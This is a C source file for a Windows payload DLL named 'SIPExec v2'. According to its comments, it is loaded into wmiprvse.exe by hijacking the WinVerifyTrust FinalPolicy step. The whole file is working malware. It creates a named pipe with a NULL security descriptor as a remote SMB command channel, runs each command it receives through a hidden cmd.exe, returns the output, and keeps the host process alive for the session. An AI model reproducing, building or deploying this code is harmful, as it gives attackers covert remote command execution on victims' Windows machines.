/*
 * sipexec_payload.c -- SIPExec v2 payload DLL
 *
 * Loaded via WinVerifyTrust FinalPolicy hijack when wmiprvse.exe
 * verifies a WMI provider DLL (triggered by Win32_Product query).
 *
 * Creates a named pipe with NULL DACL for remote SMB C2.
 * Blocks FinalPolicy return to keep wmiprvse alive for the session.
 *
 * Build: x86_64-w64-mingw32-gcc -shared -o sipexec_payload.dll sipexec_payload.c -Wall -O2
 */
#include <windows.h>
#include <stdio.h>

static volatile LONG g_ran = 0;
static HANDLE g_thread = NULL;

static HANDLE make_pipe(const char *name) {
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    SECURITY_ATTRIBUTES sa = {sizeof(sa), &sd, FALSE};
    return CreateNamedPipeA(name, PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1, 65536, 65536, 30000, &sa);
}

static DWORD WINAPI pipe_worker(LPVOID p) {
    HANDLE hp = make_pipe("\\\\.\\pipe\\sipexec");
    if (hp == INVALID_HANDLE_VALUE) return 1;

    char exe[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, exe, MAX_PATH);
    char hi[512];
    int hlen = snprintf(hi, sizeof(hi), "SIPEXEC PID=%lu EXE=%s\n",
        GetCurrentProcessId(), exe);

    OVERLAPPED ov = {0};
    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(hp, &ov);
    if (WaitForSingleObject(ov.hEvent, 120000) != WAIT_OBJECT_0) {
        CloseHandle(ov.hEvent); CloseHandle(hp); return 1;
    }
    CloseHandle(ov.hEvent);

    DWORD w;
    WriteFile(hp, hi, hlen, &w, NULL);

    for (;;) {
        char cmd[8192] = {0};
        DWORD n = 0;
        if (!ReadFile(hp, cmd, sizeof(cmd)-1, &n, NULL) || n == 0) break;
        cmd[n] = '\0';
        while (n > 0 && (cmd[n-1]=='\r'||cmd[n-1]=='\n')) cmd[--n]='\0';
        if (_stricmp(cmd,"exit")==0 || _stricmp(cmd,"quit")==0) break;

        SECURITY_ATTRIBUTES psa = {sizeof(psa), NULL, TRUE};
        HANDLE hr, hw;
        CreatePipe(&hr, &hw, &psa, 0);
        SetHandleInformation(hr, HANDLE_FLAG_INHERIT, 0);
        char full[16384];
        snprintf(full, sizeof(full), "cmd.exe /c %s", cmd);
        STARTUPINFOA si = {sizeof(si)};
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdOutput = hw; si.hStdError = hw;
        PROCESS_INFORMATION pi = {0};
        if (CreateProcessA(NULL, full, NULL, NULL, TRUE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hw);
            char buf[4096]; DWORD rd;
            while (ReadFile(hr, buf, sizeof(buf), &rd, NULL) && rd > 0)
                WriteFile(hp, buf, rd, &w, NULL);
            WaitForSingleObject(pi.hProcess, 30000);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        } else { CloseHandle(hw); }
        CloseHandle(hr);
        WriteFile(hp, "\n[SIPEXEC_DONE]\n", 16, &w, NULL);
    }
    DisconnectNamedPipe(hp); CloseHandle(hp);
    return 0;
}

static void start(void) {
    if (InterlockedCompareExchange(&g_ran, 1, 0) != 0) return;
    g_thread = CreateThread(NULL, 0, pipe_worker, NULL, 0, NULL);
}

/* FinalPolicy: blocks until pipe session ends (keeps wmiprvse alive) */
__declspec(dllexport)
long __stdcall SipExecFinalPolicy(void *prov) {
    start();
    if (g_thread) WaitForSingleObject(g_thread, 120000);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID v) {
    if (r == DLL_PROCESS_ATTACH) start();
    return TRUE;
}
